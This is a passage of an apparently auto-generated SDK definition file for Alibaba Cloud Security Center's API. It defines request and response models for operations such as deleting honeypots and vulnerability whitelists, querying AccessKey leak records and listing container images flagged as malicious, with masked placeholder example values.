  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteLoginBaseConfig', 'POST', '/', 'json', false, 'json', request);
}

model DeleteMaliciousNoteRequest {
  noteId?: long(name='NoteId', description='The ID of the remarks.

>  You can call the [ListAgentlessMaliciousFiles](~~ListAgentlessMaliciousFiles~~) operation to obtain the ID from the NoteId parameter.', example='1', position='Query'),
}

model DeleteMaliciousNoteResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='D65AADFC-1D20-5A6A-8F6A-9FA53CXXXXX'),
}

model DeleteMaliciousNoteResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteMaliciousNoteResponseBody(name='body'),
}

async function deleteMaliciousNote(request: DeleteMaliciousNoteRequest): DeleteMaliciousNoteResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteMaliciousNote', 'POST', '/', 'json', false, 'json', request);
}

model DeletePrivateRegistryRequest {
  registryId: long(name='RegistryId', description='The ID of the image repository.

> You can call the [PageImageRegistry](~~PageImageRegistry~~) operation to query the IDs of image repositories.', example='22233', position='Query'),
}

model DeletePrivateRegistryResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='818E3B38-F018-50FF-9A85-5A521747****'),
}

model DeletePrivateRegistryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeletePrivateRegistryResponseBody(name='body'),
}

async function deletePrivateRegistry(request: DeletePrivateRegistryRequest): DeletePrivateRegistryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeletePrivateRegistry', 'POST', '/', 'json', false, 'json', request);
}

model DeleteSasContainerWebDefenseRuleRequest {
  ruleId: long(name='RuleId', example='400597', position='Query'),
}

model DeleteSasContainerWebDefenseRuleResponseBody = {
  requestId?: string(name='RequestId', example='7532B7EE-7CE7-5F4D-BF04-B12447DDCAE1'),
}

model DeleteSasContainerWebDefenseRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteSasContainerWebDefenseRuleResponseBody(name='body'),
}

async function deleteSasContainerWebDefenseRule(request: DeleteSasContainerWebDefenseRuleRequest): DeleteSasContainerWebDefenseRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteSasContainerWebDefenseRule', 'POST', '/', 'json', false, 'json', request);
}

model DeleteSecurityEventMarkMissListRequest {
  ids?: [ long ](name='Ids', description='The IDs of custom defense rule.', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
}

model DeleteSecurityEventMarkMissListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='23AD0BD2-8771-5647-819E-6BA51E2XXXXX'),
}

model DeleteSecurityEventMarkMissListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteSecurityEventMarkMissListResponseBody(name='body'),
}

async function deleteSecurityEventMarkMissList(request: DeleteSecurityEventMarkMissListRequest): DeleteSecurityEventMarkMissListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteSecurityEventMarkMissList', 'POST', '/', 'json', false, 'json', request);
}

model DeleteServiceTrailRequest {
  regionId?: string(name='RegionId', description='The region in which your Security Center service is deployed. Valid values:

*   **cn-hangzhou**: center.
*   **ap-southeast-1**: Singapore.', example='cn-hangzhou', position='Query'),
}

model DeleteServiceTrailResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='20456DD5-5CBF-5015-9173-12CA4246B***'),
}

model DeleteServiceTrailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteServiceTrailResponseBody(name='body'),
}

async function deleteServiceTrail(request: DeleteServiceTrailRequest): DeleteServiceTrailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteServiceTrail', 'POST', '/', 'json', false, 'json', request);
}

model DeleteStrategyRequest {
  id: string(name='Id', description='The ID of the baseline check policy that you want to delete.', example='1404656', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.0.XX.XX', position='Query'),
}

model DeleteStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DeleteStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteStrategyResponseBody(name='body'),
}

async function deleteStrategy(request: DeleteStrategyRequest): DeleteStrategyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteStrategy', 'POST', '/', 'json', false, 'json', request);
}

model DeleteSuspEventNodeRequest {
  noteId: long(name='NoteId', description='The ID of the description.

> You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to obtain the ID of the description by using the EventNotes field.', example='123', position='Query'),
}

model DeleteSuspEventNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  message?: string(name='Message', description='The additional information that is returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='A57C711B-AA15-55B2-8F61-4D09CEXXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DeleteSuspEventNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteSuspEventNodeResponseBody(name='body'),
}

async function deleteSuspEventNode(request: DeleteSuspEventNodeRequest): DeleteSuspEventNodeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteSuspEventNode', 'POST', '/', 'json', false, 'json', request);
}

model DeleteTagWithUuidRequest {
  tagName: string(name='TagName', description='The name of the tag.', example='abc', position='Query'),
  uuidList?: string(name='UuidList', description='The UUIDs of servers.

> If the UuidList parameter is specified, Security Center removes the tag only from the servers whose UUIDs are specified by UuidList. If the UuidList parameter is not specified, Security Center removes the tag from all servers.', example='111-xx,aa-bb', position='Query'),
}

model DeleteTagWithUuidResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DeleteTagWithUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteTagWithUuidResponseBody(name='body'),
}

/**
  * Security Center provides asset importance tags and custom tags. You can call this operation to remove only the custom tag that is added to an asset.
  *
 */
async function deleteTagWithUuid(request: DeleteTagWithUuidRequest): DeleteTagWithUuidResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteTagWithUuid', 'POST', '/', 'json', false, 'json', request);
}

model DeleteUniBackupPolicyRequest {
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

>  You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies. You must specify at least one of the PolicyId parameter and the **PolicyIds** parameter.', example='123', position='Query'),
  policyIds?: string(name='PolicyIds', description='The IDs of anti-ransomware policies.

>  You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies. You must specify at least one of the **PolicyId** parameter and the PolicyIds parameter.', example='123,124', position='Query'),
}

model DeleteUniBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4F07F4F1-88ED-5569-B519-FFCC9B7E****'),
}

model DeleteUniBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteUniBackupPolicyResponseBody(name='body'),
}

async function deleteUniBackupPolicy(request: DeleteUniBackupPolicyRequest): DeleteUniBackupPolicyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteUniBackupPolicy', 'POST', '/', 'json', false, 'json', request);
}

model DeleteVpcHoneyPotRequest {
  vpcId: string(name='VpcId', description='The ID of the virtual private cloud (VPC) on which the honeypot is deployed.

> You can call the [DescribeVpcHoneyPotList](~~DescribeVpcHoneyPotList~~) operation to query the IDs of VPCs.', example='vpc-d7o009q63fqy21r8u****', position='Query'),
}

model DeleteVpcHoneyPotResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4347E985-6E64-467B-96EC-30D4EA9E32FB'),
}

model DeleteVpcHoneyPotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteVpcHoneyPotResponseBody(name='body'),
}

async function deleteVpcHoneyPot(request: DeleteVpcHoneyPotRequest): DeleteVpcHoneyPotResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteVpcHoneyPot', 'POST', '/', 'json', false, 'json', request);
}

model DeleteVulWhitelistRequest {
  id?: string(name='Id', description='The ID of the whitelist.

>  To delete a vulnerability whitelist, you must provide the ID of the whitelist. You can call the [DescribeVulWhitelist](~~DescribeVulWhitelist~~) operation to query the IDs of whitelists.', example='131231', position='Query'),
  whitelist?: string(name='Whitelist', description='The information about the whitelist. The value is a JSON string that contains the following fields:

*   **Name**: the name of the vulnerability.

*   **Type**: the type of the vulnerability. Valid values:

    *   **cve**: Linux software vulnerability
    *   **sys**: Windows system vulnerability
    *   **cms**: Web-CMS vulnerability
    *   **app**: application vulnerability
    *   **emg**: urgent vulnerability

*   **AliasName**: the alias of the vulnerability.', example='[
      {
            "Name": "oval:com.redhat.rhsa:def:20173263",
            "Type": "cve",
            "AliasName": "RHSA-2017:3263: curl security update"
      }
]', position='Query'),
}

model DeleteVulWhitelistResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9FBC6E47-7508-58C9-9E76-528E118CB1CC'),
}

model DeleteVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteVulWhitelistResponseBody(name='body'),
}

async function deleteVulWhitelist(request: DeleteVulWhitelistRequest): DeleteVulWhitelistResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DeleteVulWhitelist', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAccessKeyLeakDetailRequest {
  id: long(name='Id', description='The ID of the AccessKey pair leak.', example='389357', position='Query'),
}

model DescribeAccessKeyLeakDetailResponseBody = {
  accesskeyId?: string(name='AccesskeyId', description='The ID of the AccessKey pair that is leaked.', example='LTAI4G4VjkC9wenfEvgX****'),
  asset?: string(name='Asset', description='The platform to which the asset belongs. The value is fixed as **Cloud platform**.', example='Cloud platform'),
  code?: string(name='Code', description='The code snippet that is leaked.', example='\\n1231 \\nak=LTAI4G4VjkC9wenfEvgX**** \\n12311123 \\nsk1999 \\nsk1999sk1999 \\nsk1999sk1999 \\n\\n\\ntest001 ak hht \\nak=LTAI4G4VjkC9wenfEvgX**** \\nsk=AjEhS9XmnIzllpAx2LxMTMdrTG****'),
  dealTime?: string(name='DealTime', description='The time when the AccessKey pair leak was handled.', example='2022-01-17 15:47:08'),
  dealType?: string(name='DealType', description='The solution to the AccessKey pair leak. Valid values:

*   **manual**: manually deleted
*   **disable**: manually disabled
*   **add-whitelist**: added to the whitelist
*   **pending**: unhandled', example='add-whitelist'),
  githubFileName?: string(name='GithubFileName', description='The name of the GitHub file.', example='testAkLeak'),
  githubFileType?: string(name='GithubFileType', description='The type of the GitHub file. Valid values:

*   Python
*   XML
*   GO
*   Javascript
*   INI
*   JSON
*   C++', example='Python'),
  githubFileUpdateTime?: string(name='GithubFileUpdateTime', description='The time when the GitHub file was updated.', example='2021-07-06T09:49:33'),
  githubFileUrl?: string(name='GithubFileUrl', description='The URL of the GitHub file.', example='https://github.com/Blue00Blue/ExamOnline/blob/6c932c10fc3f217783f3937e2b230f79656c18a7/testAk****'),
  githubRepoName?: string(name='GithubRepoName', description='The name of the GitHub repository.', example='ExamOnline'),
  githubRepoUrl?: string(name='GithubRepoUrl', description='The URL of the GitHub repository.', example='https://github.com/Blue00Blue/ExamOn****'),
  githubUser?: string(name='GithubUser', description='The username of the GitHub user.', example='Blue00Blue'),
  githubUserPicUrl?: string(name='GithubUserPicUrl', description='The URL of the profile picture for the GitHub user.', example='https://avatars.githubusercontent.com/u/26296896?s=48&v=****'),
  gmtCreate?: string(name='GmtCreate', description='The first time when the AccessKey pair leak was detected.', example='2021-07-06 17:49:41'),
  gmtModified?: string(name='GmtModified', description='The last time when the AccessKey pair leak was detected.', example='2021-07-06 17:49:39'),
  remark?: string(name='Remark', description='The remarks of the AccessKey pair leak.', example='12'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  source?: string(name='Source', description='The platform on which the AccessKey pair leak is detected.', example='GitHub'),
  tokenValid?: int32(name='TokenValid', description='The validity of the key associated with the AK. Value:

* 0: to be confirmed
* 1: Valid
* 2: Invalid', example='2'),
  type?: string(name='Type', description='The type of the leak. The value is fixed as **AccessKey**.', example='AccessKey'),
  whitelistStatus?: string(name='WhitelistStatus', description='Indicates whether the AccessKey pair leak is added to the whitelist. Valid values:

*   **no**: no
*   **yes**: yes', example='no'),
  whitelistTime?: long(name='WhitelistTime', description='The time when the AK whitelist was added. Unit: milliseconds.', example='1689172004478'),
}

model DescribeAccessKeyLeakDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAccessKeyLeakDetailResponseBody(name='body'),
}

async function describeAccessKeyLeakDetail(request: DescribeAccessKeyLeakDetailRequest): DescribeAccessKeyLeakDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAccessKeyLeakDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAccesskeyLeakListRequest {
  currentPage: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  pageSize: int32(name='PageSize', description='The number of entries to return on each page.\\
Maximum value: 100. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  query?: string(name='Query', description='The AccessKey ID that you want to query. Only exact match is supported.', example='LTAI4Fytv7ALKzkNVBV6****', position='Query'),
  startTs?: long(name='StartTs', description='The beginning of the time range to query. You can query all AccessKey pair leaks that are detected later than this time point. The value of this parameter is a UNIX timestamp. Unit: milliseconds.', example='1614155361489', position='Query'),
  status?: string(name='Status', description='Specifies whether an AccessKey pair leak is handled. Valid values:

*   **pending**: unhandled
*   **dealed**: handled', example='pending', position='Query'),
}

model DescribeAccesskeyLeakListResponseBody = {
  accessKeyLeakList?: [ 
    {
      accesskeyId?: string(name='AccesskeyId', description='The ID of the AccessKey pair that is leaked.', example='LTAI4Fytv7ALKzkNVBV6****'),
      aliUserName?: string(name='AliUserName', description='The name of the Alibaba Cloud account that is affected.', example='testAccountName'),
      asset?: string(name='Asset', description='The platform to which the asset belongs. The value is fixed as **Cloud platform**.', example='Cloud platform'),
      dealTime?: string(name='DealTime', description='The time when the AccessKey pair leak is handled.', example='2020-12-03 21:23:38'),
      dealType?: string(name='DealType', description='The method to handle the AccessKey pair leak. Valid values:

*   **pending**: The AccessKey pair leak is unhandled.
*   **manual**: The AccessKey pair leak is manually handled.
*   **disable**: The AccessKey pair leak is disabled.
*   **add-whitelist**: The AccessKey pair leak is added to the whitelist.', example='pending'),
      gmtModified?: long(name='GmtModified', description='The time when the AccessKey pair leak is first detected. The value of this parameter is a UNIX timestamp. Unit: milliseconds.', example='1612357897000'),
      id?: long(name='Id', description='The primary key ID of the database.', example='389357'),
      status?: string(name='Status', description='Indicates whether the AccessKey pair leak is handled. Valid values:

*   **pending**: unhandled
*   **dealed**: handled', example='pending'),
      type?: string(name='Type', description='The type of the leak. The value is fixed as **AccessKey**.', example='AccessKey'),
      url?: string(name='Url', description='The URL of the platform on which the AccessKey pair leak is detected.', example='https://github.com/hht312/test-ak/blob/0e466d2ecce55b4c924d773a058e5dc602d8****/1001'),
      userType?: string(name='UserType', description='The type of the account to which the leaked AccessKey pair belongs. Valid values:

*   **master**: Alibaba Cloud account
*   **ram**: RAM user', example='master'),
    }
  ](name='AccessKeyLeakList', description='An array that consists of the details about AccessKey pair leaks.'),
  akLeakCount?: int32(name='AkLeakCount', description='The number of AccessKey pair leaks that are unhandled.', example='1'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  gmtLast?: long(name='GmtLast', description='This parameter is deprecated.', example='1612357897000'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='B37C9052-A73E-4707-A024-9247702852BE'),
  totalCount?: int32(name='TotalCount', description='The total number of AccessKey pair leaks.', example='2'),
}

model DescribeAccesskeyLeakListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAccesskeyLeakListResponseBody(name='body'),
}

async function describeAccesskeyLeakList(request: DescribeAccesskeyLeakListRequest): DescribeAccesskeyLeakListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAccesskeyLeakList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAffectedAssetsRequest {
  current?: string(name='Current', description='The number of the page to return.', example='1', position='Query'),
  levels?: string(name='Levels', description='The severity. Separate multiple severities with commas (,). Valid values:

*   serious
*   suspicious
*   remind', example='serious,suspicious,remind', position='Query'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='10', position='Query'),
}

model DescribeAffectedAssetsResponseBody = {
  assetList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='11'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='11'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='10.10.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.0.XX.XX'),
      riskNum?: int32(name='RiskNum', description='The number of viruses detected on the server.', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='947d7514-258a-4b47-9dde-9dxxxxxxxxxx'),
    }
  ](name='AssetList', description='An array that consists of the affected servers.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='7E0618A9-D5EF-4220-9471-C42XXXXXXXX'),
}

model DescribeAffectedAssetsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAffectedAssetsResponseBody(name='body'),
}

async function describeAffectedAssets(request: DescribeAffectedAssetsRequest): DescribeAffectedAssetsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAffectedAssets', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAffectedMaliciousFileImagesRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c60b77fe62093480db6164a3c2fa5****', position='Query'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='minikube', position='Query'),
  containerId?: string(name='ContainerId', description='The ID of the container.', example='cc20a1024011c44b6a8710d6f8b****', position='Query'),
  currentPage: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1', position='Query'),
  image?: string(name='Image', description='The name of the container image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-****', position='Query'),
  imageDigest?: string(name='ImageDigest', description='The image digest.', example='6a5e103187b31a94592a47a5858617f7a179ead61df7606****', position='Query'),
  imageLayer?: string(name='ImageLayer', description='The image layer.', example='27213ad375b53628dd152a5ca****', position='Query'),
  imageTag?: string(name='ImageTag', description='The tag that is added to the image.', example='0.2', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  levels?: string(name='Levels', description='The severity. Separate multiple severities with commas (,). Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious,suspicious', position='Query'),
  maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious image sample.

>  You can call the [DescribeGroupedMaliciousFiles](~~DescribeGroupedMaliciousFiles~~) operation to query the MD5 hash values of malicious image samples.', example='d836968041f7683b5459****', position='Query'),
  namespace?: string(name='Namespace', description='The namespace.', example='test-002', position='Query'),
  pageSize: string(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20', position='Query'),
  pod?: string(name='Pod', description='The pod.', example='22222-7xsqq', position='Query'),
  repoId?: string(name='RepoId', description='The ID of the image repository.

>  You can call the [ListRepository](~~451339~~) operation to query the IDs of image repositories from the value of the **RepoId** response parameter.', example='crr-vridcl4****', position='Query'),
  repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container image.

>  You can call the [ListRepository](~~451339~~) operation to query the IDs of container images from the value of the **InstanceId** response parameter.', example='cri-datvailb****', position='Query'),
  repoName?: string(name='RepoName', description='The name of the image repository.

>  Fuzzy match is supported.', example='centos', position='Query'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.

>  Fuzzy match is supported.', example='hanghai-namespace', position='Query'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository. Valid values:

*   **cn-beijing**: China (Beijing)
*   **cn-zhangjiakou**: China (Zhangjiakou)
*   **cn-hangzhou**: China (Hangzhou)
*   **cn-shanghai**: China (Shanghai)
*   **cn-shenzhen**: China (Shenzhen)
*   **cn-hongkong**: China (Hong Kong)
*   **ap-southeast-1**: Singapore
*   **ap-southeast-5**: Indonesia (Jakarta)
*   **us-east-1**: US (Virginia)
*   **us-west-1**: US (Silicon Valley)
*   **eu-central-1**: Germany (Frankfurt)
*   **eu-west-1**: UK (London)
*   **ap-south-1**: India (Mumbai)', example='cn-hangzhou', position='Query'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.', position='Query'),
  status?: string(name='Status', description='镜像恶意样本处理状态。取值：
- **0**：未处理
- **1**：已处理
- **2**：验证中
- **3**：已加白', example='0', position='Query'),
}

model DescribeAffectedMaliciousFileImagesResponseBody = {
  affectedMaliciousFileImagesResponse?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c08d5fc1a329a4b88950a253d082f1****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='04d20e98c8e2c93b7b864372084320a15a58c8671e53c972ce3a71d9c163****'),
      digest?: string(name='Digest', description='The image digest.', example='6a5e1031a5858617f7d8a179ead6****'),
      downloadUrl?: string(name='DownloadUrl', description='The URL to download the malicious image sample.', example='https://aegis-metadata-file.oss-cn-shanghai.aliyuncs.com/'),
      filePath?: string(name='FilePath', description='The path to the image file.', example='/d836968041f7683b5605a****'),
      firstScanTimestamp?: long(name='FirstScanTimestamp', description='The timestamp of the first scan.', example='1594907349000'),
      highLight?: string(name='HighLight', description='The text that is highlighted.', example='{"ruleVersion":"highlight_20210908","ruleId":600106,"events":[[2,54]]}'),
      image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-conta****'),
      imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='e05c0de798217637868ef4****'),
      instanceName?: string(name='InstanceName', example='sql-test-001'),
      internetIp?: string(name='InternetIp', example='47.101.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='172.22.XX.XX'),
      latestScanTimestamp?: long(name='LatestScanTimestamp', description='The timestamp of the last scan.', example='1596522785000'),
      latestVerifyTimestamp?: long(name='LatestVerifyTimestamp', description='The timestamp of the last verification.', example='1596522711000'),
      layer?: string(name='Layer', description='The image layer.', example='27213ad3447f0209dd152a5cadea****'),
      level?: string(name='Level', description='The severity of the malicious image sample. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
      maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious image sample.', example='d836968041f768300d9605a****'),
      namespace?: string(name='Namespace', description='The namespace to which the image repository belongs.', example='hanghai-namespace'),
      pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-vridcl4****'),
      repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container image.', example='cri-datvail3m****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='centos'),
      repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-shanghai'),
      status?: int32(name='Status', description='The handling status of the malicious image sample. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: verifying
*   **3**: added to the whitelist', example='1'),
      tag?: string(name='Tag', description='The tag that is added to the image.', example='0.2'),
      targetId?: string(name='TargetId', example='m-bp17m0pc0xprzbwo****'),
      targetName?: string(name='TargetName', example='source-test-obj-9LaLJ'),
      targetType?: string(name='TargetType', example='ECS_IMAGE'),
      uuid?: string(name='Uuid', example='48a473c4-1650-4931-a822-7e6c2c28****'),
    }
  ](name='AffectedMaliciousFileImagesResponse', description='An array consisting of the images that have malicious image samples.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of images that have malicious image samples returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Pages start from page **1**. Default value: **1**.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of images that have malicious image samples.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ACF97412-FD09-4D1F-994F-34DF12BREF20'),
}

model DescribeAffectedMaliciousFileImagesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAffectedMaliciousFileImagesResponseBody(name='body'),
}

async function describeAffectedMaliciousFileImages(request: DescribeAffectedMaliciousFileImagesRequest): DescribeAffectedMaliciousFileImagesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAffectedMaliciousFileImages', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAgentInstallStatusRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid value:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='59.46.XXX.XXX', position='Query'),
  uuids: string(name='Uuids', description='The UUIDs of servers. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='inet-eae014a7-16c4-4d4e-9f03-5208f4dc****,inet-eae047da-1e5a-41ce-828d-47606e9b****', position='Query'),
}

model DescribeAgentInstallStatusResponseBody = {
  aegisClientInvokeStatusResponseList?: [ 
    {
      message?: string(name='Message', description='The returned message.', example='Installed'),
      resuleCode?: string(name='ResuleCode', description='The installation status. Valid value:

*   **-1**: The agent is not installed.
*   **0**: The agent is installed.
*   **1**: Failed to create a directory in the client.
*   **2**: Failed to download the installation package.
*   **3**: The installation file does not exist.
*   **4**: The verification information of the installation file does not exist.
*   **5**: Failed to verify the installation file.
*   **6**: Failed to execute the installation file.
*   **7**: You do not have the required permissions. The installation failed.
*   **8**: No client process is detected.
*   **100**: The installation failed due to an unknown error.
*   **1001**: The installation failed. One-click installation is not supported in this region.
*   **1002**: The installation failed. Servers that are not provided by Alibaba Cloud are not supported. Install the agent by executing a script on the server.
*   **1003**: The installation failed. The operating system is not supported.
*   **1004**: An internal error occurred. Try again later.
*   **1005**: The Elastic Compute Service (ECS) instance is not started. Start the ECS instance and try again.
*   **1006**: One-click installation is not supported for ECS instances of the classic network type.
*   **1007**: The running command is manually stopped.
*   **1008**: Cloud Assistant is not installed. You cannot install the client.
*   **1009**: The command execution timed out. Try again later.
*   **1010**: The machine is already online. You do not need to install a client.', example='1'),
      result?: int32(name='Result', description='The installation result. Valid value:

*   **-1**: The agent is not installed.
*   **0**: The agent is being installed.
*   **1**: The agent is installed.
*   **2**: The installation failed.', example='0'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='d123f6ae-9749-4338-8c7f-3c2c1ead****'),
    }
  ](name='AegisClientInvokeStatusResponseList', description='The status of servers.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeAgentInstallStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAgentInstallStatusResponseBody(name='body'),
}

async function describeAgentInstallStatus(request: DescribeAgentInstallStatusRequest): DescribeAgentInstallStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAgentInstallStatus', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAlarmEventDetailRequest {
  alarmUniqueInfo: string(name='AlarmUniqueInfo', description='The unique identifier of the alert event.

